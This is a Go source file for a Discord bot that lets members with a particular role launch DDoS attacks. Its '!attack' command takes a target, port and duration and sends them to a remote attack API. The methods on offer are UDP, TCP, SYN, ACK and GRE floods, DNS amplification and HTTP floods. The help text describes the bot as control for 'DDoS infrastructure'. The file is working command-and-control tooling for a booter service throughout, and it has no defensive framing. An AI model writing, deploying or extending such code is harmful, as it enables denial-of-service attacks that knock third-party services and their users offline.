package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/bwmarrin/discordgo"
)

const (
	APIBaseURL    = "https://scream.gov:443"
	APIKey        = "sk_live"
	CommandPrefix = "!"
	AdminRoleName = "Ice Guy"
	BotToken      = ""
)

type AttackMethod struct {
	Name string
	Desc string
}

var AttackMethods = map[string]AttackMethod{
	"udpflood": {"UDP Flood", "High volume UDP packets flood"},
	"udpsmart": {"UDP Smart", "Smart UDP flood with packet optimization"},
	"tcpflood": {"TCP Flood", "Standard TCP connection flood"},
	"synflood": {"SYN Flood", "SYN packets flood (half-open connections)"},
	"ackflood": {"ACK Flood", "ACK packets flood"},
	"greflood": {"GRE Flood", "GRE protocol flood"},
	"dns":      {"DNS Amplification", "DNS amplification attack (port 53 only)"},
	"http":     {"HTTP Flood", "HTTP request flood"},
}

type AttackRequest struct {
	UserID   string `json:"user_id"`
	Username string `json:"username"`
	Method   string `json:"method"`
	Target   string `json:"target"`
	Port     int    `json:"port"`
	Duration int    `json:"duration"`
}

type AttackResponse struct {
	AttackID string `json:"attack_id"`
	Error    string `json:"error"`
}

func main() {
	dg, err := discordgo.New("Bot " + BotToken)
	if err != nil {
		fmt.Println("Error creating Discord session:", err)
		return
	}

	dg.AddHandler(ready)
	dg.AddHandler(messageCreate)

	err = dg.Open()
	if err != nil {
		fmt.Println("Error opening connection:", err)
		return
	}
	defer dg.Close()

	fmt.Println("Bot is now running. Press CTRL-C to exit.")
	select {}
}

func ready(s *discordgo.Session, event *discordgo.Ready) {
	s.UpdateGameStatus(0, CommandPrefix+"ddoshelp")
	fmt.Printf("Logged in as %s (%s)\n", event.User.Username, event.User.ID)
}

func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID == s.State.User.ID {
		return
	}

	if !strings.HasPrefix(m.Content, CommandPrefix) {
		return
	}

	args := strings.Fields(m.Content)
	command := strings.TrimPrefix(args[0], CommandPrefix)

	switch command {
	case "attack":
		handleAttack(s, m, args[1:])
	case "status":
		handleStatus(s, m, args[1:])
	case "methods":
		handleMethods(s, m)
	case "ddoshelp":
		handleHelp(s, m)
	}
}

func handleAttack(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if !hasAdminRole(s, m) {
		s.ChannelMessageSend(m.ChannelID, "⛔ You don't have permission to use this command.")
		return
	}

	if len(args) < 4 {
		s.ChannelMessageSend(m.ChannelID, "❌ Usage: !attack <method> <target> <port> <duration>")
		return
	}

	method := strings.ToLower(args[0])
	target := args[1]
	port, err := strconv.Atoi(args[2])
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Port must be a number")
		return
	}

	duration, err := strconv.Atoi(args[3])
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "❌ Duration must be a number")
		return
	}

	if _, exists := AttackMethods[method]; !exists {
		methodsList := buildMethodsList()
		s.ChannelMessageSend(m.ChannelID, "❌ Invalid attack method. Available methods:\n"+methodsList)
		return
	}

	if port < 1 || port > 65535 {
		s.ChannelMessageSend(m.ChannelID, "❌ Port must be between 1 and 65535")
		return
	}

	if duration < 1 || duration > 300 {
		s.ChannelMessageSend(m.ChannelID, "❌ Duration must be between 1 and 300 seconds")
		return
	}

	if method == "dns" && port != 53 {
		s.ChannelMessageSend(m.ChannelID, "❌ DNS attacks must target port 53")
		return
	}

	attackName := AttackMethods[method].Name
	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf(
		"🚀 Launching %s attack on %s:%d for %s...",
		attackName, target, port, formatDuration(duration),
	))

	success, result := sendAttack(method, target, port, duration, m.Author.ID, m.Author.Username)

	if success {
		attackID := result
		embed := &discordgo.MessageEmbed{
			Title: "✅ Attack launched successfully!",
			Fields: []*discordgo.MessageEmbedField{
				{Name: "Method", Value: attackName, Inline: true},
				{Name: "Target", Value: fmt.Sprintf("%s:%d", target, port), Inline: true},
				{Name: "Duration", Value: formatDuration(duration), Inline: true},
				{Name: "ID", Value: fmt.Sprintf("`%s`", attackID), Inline: false},
			},
			Description: fmt.Sprintf("Use `%sstatus %s` to check status", CommandPrefix, attackID),
		}

		s.ChannelMessageSendEmbed(m.ChannelID, embed)

		go func() {
			time.Sleep(time.Duration(duration) * time.Second)
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("⏳ Attack `%s` should be complete now.", attackID))
		}()
	} else {
		s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("❌ Failed to launch attack: %s", result))
	}
}

func handleStatus(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if len(args) < 1 {
		s.ChannelMessageSend(m.ChannelID, "❌ Usage: !status <attack_id>")
		return
	}

	attackID := args[0]
	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("🔍 Attack status checking not fully implemented yet. ID: `%s`", attackID))
}

func handleMethods(s *discordgo.Session, m *discordgo.MessageCreate) {
	embed := &discordgo.MessageEmbed{
		Title:       "Available Attack Methods",
		Description: "List of all supported attack protocols",
		Color:       0x3498db,
	}

	for method, info := range AttackMethods {
		embed.Fields = append(embed.Fields, &discordgo.MessageEmbedField{
			Name:   fmt.Sprintf("%s%s - %s", CommandPrefix, method, info.Name),
			Value:  info.Desc,
			Inline: false,
		})
	}

	s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func handleHelp(s *discordgo.Session, m *discordgo.MessageCreate) {
	embed := &discordgo.MessageEmbed{
		Title:       "DDoS Bot Help",
		Description: "Commands for controlling the DDoS infrastructure",
		Color:       0x2ecc71,
		Fields: []*discordgo.MessageEmbedField{
			{
				Name:   fmt.Sprintf("%sattack <method> <target> <port> <duration>", CommandPrefix),
				Value:  "Launch a DDoS attack\nExample: `!attack udpflood example.com 80 60`",
				Inline: false,
			},
			{
				Name:   fmt.Sprintf("%sstatus <attack_id>", CommandPrefix),
				Value:  "Check status of an attack",
				Inline: false,
			},
			{
				Name:   fmt.Sprintf("%smethods", CommandPrefix),
				Value:  "List all available attack methods",
				Inline: false,
			},
		},
		Footer: &discordgo.MessageEmbedFooter{
			Text: fmt.Sprintf("Requires '%s' role to execute attacks", AdminRoleName),
		},
	}

	s.ChannelMessageSendEmbed(m.ChannelID, embed)
}

func hasAdminRole(s *discordgo.Session, m *discordgo.MessageCreate) bool {
	member, err := s.GuildMember(m.GuildID, m.Author.ID)
	if err != nil {
		return false
	}

	for _, roleID := range member.Roles {
		role, err := s.State.Role(m.GuildID, roleID)
		if err != nil {
			continue
		}
		if role.Name == AdminRoleName {
			return true
		}
	}

	return false
}

func sendAttack(method, target string, port, duration int, userID, username string) (bool, string) {
	payload := AttackRequest{
		UserID:   userID,
		Username: username,
		Method:   method,
		Target:   target,
		Port:     port,
		Duration: duration,
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return false, "Failed to create request"
	}

	fmt.Printf("DEBUG - Sending payload: %s\n", string(jsonData))

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	req, err := http.NewRequest("POST", APIBaseURL+"/api/v1/discord/attack", bytes.NewBuffer(jsonData))
	if err != nil {
		return false, "Failed to create request"
	}

	req.Header.Set("X-API-Key", APIKey)
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		return false, fmt.Sprintf("Connection Error: %s", err)
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Printf("DEBUG - Received response: %s\n", string(body))

	if resp.StatusCode != 200 {
		return false, fmt.Sprintf("API Error (%d): %s", resp.StatusCode, string(body))
	}

	var attackResp AttackResponse
	if err := json.Unmarshal(body, &attackResp); err != nil {
		return false, "Failed to parse response"
	}
	return true, attackResp.AttackID
}

func formatDuration(seconds int) string {
	minutes := seconds / 60
	seconds = seconds % 60

	if minutes > 0 {
		return fmt.Sprintf("%dm %ds", minutes, seconds)
	}
	return fmt.Sprintf("%ds", seconds)
}

func buildMethodsList() string {
	var builder strings.Builder
	for method, info := range AttackMethods {
		builder.WriteString(fmt.Sprintf("- %s: %s\n", method, info.Desc))
	}
	return builder.String()
}
